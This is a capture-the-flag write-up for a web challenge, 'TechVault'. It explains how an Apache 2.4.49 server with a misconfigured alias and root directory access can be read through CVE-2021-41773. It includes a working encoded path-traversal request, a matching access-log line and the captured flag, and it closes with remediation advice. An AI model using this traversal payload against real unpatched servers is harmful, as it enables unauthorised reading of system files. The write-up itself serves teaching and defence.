# CTF Write-up: TechVault

## Challenge Overview

We are examining "TechVault", a web container running a premium gadget store. We are provided with the full deployment files.

### The "Many Files" Problem
The challenge name and your query likely hint at the critical vulnerability: **Arbitrary File Access** via a misconfigured alias named `/files/`.

## 1. The Vulnerability (The "Files" Problem)

The core issue lies in `conf/httpd.conf`.

### The Dangerous Alias

Line 56 defines an alias:

```apache
Alias /files/ "/usr/local/apache2/htdocs/"
```

This maps the URL `http://site/files/` to the internal folder `/usr/local/apache2/htdocs/`.

### The Version Flaw

The Dockerfile shows the server version:

```dockerfile
FROM httpd:2.4.49
```

Apache 2.4.49 is infamous for **CVE-2021-41773**. This version introduced a path normalization bug. If a URL path is not normalized correctly, the server can be tricked into traversing directories using encoded characters.

### The Missing Guardrails

Usually, Apache denies access to the root filesystem. However, this config explicitly allows it:

```apache
<Directory />
    AllowOverride none
    Require all granted  <-- CRITICAL ERROR
</Directory>
```

Because access is granted to root (`/`), if we can escape the `/files/` directory, we can read anything.

## 2. Solving the Challenge (Exploitation)

To "solve" the challenge and get the flag, we need to traverse out of the `/files/` directory to the system root.

### The Attack Path

Standard traversal (`../`) is blocked by modern browsers and basic server checks. CVE-2021-41773 allows us to bypass this using URL encoding.

- **Standard:** `../`
- **Exploit:** `.%2e/` (The dot is encoded)

### The Payload

We construct a request that goes into `/files/` and then traverses back 4 levels to the root.

- **Target File:** `/flag.txt` (Found in the Dockerfile)

**Request:**
```http
GET /files/.%2e/.%2e/.%2e/.%2e/flag.txt
```

**Evidence from `logs/access_log`:**
We can see the attacker successfully performing this exact request in the provided logs:

```
172.22.0.1 - - [21/Nov/2025:21:48:52 +0000] "GET /files/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1" 200 45
```

### The Flag

By reading the Dockerfile (or theoretically sending the curl request above), we find the flag:

`Securinets{P4th_Tr4v3rs4l_1s_T00_Ez_In_2021}`

## 3. Fixing the Problem (Remediation)

If you were the administrator trying to fix the "Many Files Problem" to secure TechVault:

1. **Upgrade Apache:** Update from 2.4.49 to the latest version (patched in 2.4.50/51).
2. **Restrict Root Access:** Change the `<Directory />` block in `httpd.conf`:

```apache
<Directory />
    AllowOverride none
    Require all denied  <-- CHANGE THIS
</Directory>
```

This ensures that even if traversal is possible, the server will refuse to serve files outside the web root.
